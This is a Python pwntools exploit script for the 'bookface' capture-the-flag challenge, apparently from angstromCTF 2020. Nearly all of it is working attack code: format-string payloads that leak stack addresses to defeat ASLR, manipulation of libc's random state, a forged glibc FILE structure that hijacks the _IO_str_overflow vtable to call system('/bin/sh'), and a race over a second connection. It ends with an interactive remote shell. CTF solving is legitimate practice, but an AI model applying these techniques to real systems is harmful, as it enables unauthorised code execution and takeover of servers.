from random import randint
from pwn import *


# A handy function to craft FILE structures
# https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
def pack_file(_flags=0,
              _IO_read_ptr=0,
              _IO_read_end=0,
              _IO_read_base=0,
              _IO_write_base=0,
              _IO_write_ptr=0,
              _IO_write_end=0,
              _IO_buf_base=0,
              _IO_buf_end=0,
              _IO_save_base=0,
              _IO_backup_base=0,
              _IO_save_end=0,
              _IO_marker=0,
              _IO_chain=0,
              _fileno=0,
              _lock=0):
    struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    struct = struct.ljust(0x88, b"\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, b"\x00")
    return struct


def make_fake_file_struct(libc_base, rip, rdi):
    # We can only have even rdi
    assert(rdi % 2 == 0)

    # Crafting FILE structure

    # This stores the address of a pointer to the _IO_str_overflow function
    # Libc specific
    io_str_overflow_ptr_addr = libc_base + \
        libc.symbols['_IO_file_jumps'] + 0xd8
    # Calculate the vtable by subtracting appropriate offset
    fake_vtable_addr = io_str_overflow_ptr_addr - 2*8

    # Craft file struct
    file_struct = pack_file(_IO_buf_base=0,
                            _IO_buf_end=(rdi-100)//2,
                            _IO_write_ptr=(rdi-100)//2,
                            _IO_write_base=0,
                            _lock=0)
    # vtable pointer
    file_struct += p64(fake_vtable_addr)
    # Next entry corresponds to: (*((_IO_strfile *) fp)->_s._allocate_buffer)
    file_struct += p64(rip)

    return file_struct


def main():
    binary_offset = 0x4985
    libc_offset = 0x20830

    random_state_offset = 0x3c40b8

    uid = randint(0, 2**30)

    # create user with uid and name AAAA
    T.sendlineafter("Please enter your user ID: ", str(uid))
    T.sendlineafter("What's your name? ", b"AAAA")

    # logout
    T.sendlineafter("> ", "4")
    # login again with same uid
    T.sendlineafter("Please enter your user ID: ", str(uid))

    # fmt_offset = 8
    payload = b'AA%21$pBB'

    assert len(payload) <= 12
    T.sendlineafter("Content: ", payload)

    T.recvuntil(b'AA')
    leak = T.recvuntil(b'BB').strip(b'BB')
    leak = int(leak, base=16)
    log.info("leak: 0x{:016x}".format(leak))
    binary_base = leak - binary_offset
    log.info("binary_base: 0x{:016x}".format(binary_base))

    payload = b'10\n10\n10\n10\n'
    assert len(payload) <= 12
    T.sendlineafter("Content: ", payload)

    # logout
    T.sendlineafter("> ", "4")
    # login again with same uid
    T.sendlineafter("Please enter your user ID: ", str(uid))

    # fmt_offset = 8
    payload = b'AA%35$pBB'

    assert len(payload) <= 12
    T.sendlineafter("Content: ", payload)

    T.recvuntil(b'AA')
    leak = T.recvuntil(b'BB').strip(b'BB')
    leak = int(leak, base=16)
    log.info("leak: 0x{:016x}".format(leak))

    libc_base = leak - libc_offset
    log.info("libc_base: 0x{:016x}".format(libc_base))

    random_state = libc_base + random_state_offset
    log.info("random_state: 0x{:016x}".format(random_state))

    payload = b'10\n10\n10\n10\n'
    assert len(payload) <= 12
    T.sendlineafter("Content: ", payload)

    # set random_stat fptr and rptr to 0
    # in order to make rand() return 0
    # fptr
    T.sendlineafter("> ", "1")
    T.sendlineafter("you like to make? ", str(random_state//8))

    # logout
    T.sendlineafter("> ", "4")
    # login again with the same
    T.sendlineafter("Please enter your user ID: ", str(uid))

    T.sendlineafter("Content: ", b'A'*11)
    T.sendlineafter("Content: ", b'A'*11)

    # rptr = rptr + 8
    T.sendlineafter("> ", "1")
    T.sendlineafter("you like to make? ", str(8//8))

    # logout
    T.sendlineafter("> ", "4")
    # login again with the same uid
    T.sendlineafter("Please enter your user ID: ", str(uid))

    T.sendlineafter("Content: ", b'A'*11)
    T.sendlineafter("Content: ", b'A'*11)

    # logout
    T.sendlineafter("> ", "4")
    # login again with wrong uid
    uid = randint(0, 2**30)
    T.sendlineafter("Please enter your user ID: ", str(uid))

    # Our target
    # mmap to 0
    file_addr = 0
    rip = libc_base + libc.symbols['system']
    # The first param we want
    # rdi = libc_base + next(libc.search(b"/bin/sh"))
    # next to file_struct
    rdi = 0xf0

    log.info("file_addr 0x{:016x}".format(file_addr))
    log.info("rip 0x{:016x}".format(rip))
    log.info("rdi 0x{:016x}".format(rdi))

    file_struct = make_fake_file_struct(libc_base, rip, rdi)

    file_struct = file_struct.ljust(0xf0, b'\x00')
    payload = file_struct + b'/bin/sh\x00'
    assert b'\n' not in payload

    T.sendlineafter("What's your name? ", payload)

    # logout
    T.sendlineafter("> ", "4")

    # login again with the last uid
    T.sendlineafter("Please enter your user ID: ", str(uid))

    # remove the uid user file with another connection
    # TOCTOU
    log.info("uid: {}".format(uid))
    log.info("TOCTOU !!")
    T2 = remote(T.rhost, T.rport)
    T2.sendlineafter("Please enter your user ID: ", str(uid))
    T2.sendlineafter("Content", b"10\n10\n10\n10")
    T2.sendlineafter("> ", "3")

    payload = b'10\n10\n10\n10\n'
    assert len(payload) <= 12
    T.sendlineafter("Content: ", payload)

    T.clean()
    T.sendline("uname -a;id")
    T.interactive()


if __name__ == "__main__":
    T = remote("pwn.2020.chall.actf.co", 20733)
    # T = remote("127.0.0.1", 1234)
    binary = ELF("./bookface", checksec=False)
    libc = ELF("libc.so.6", checksec=False)
    main()
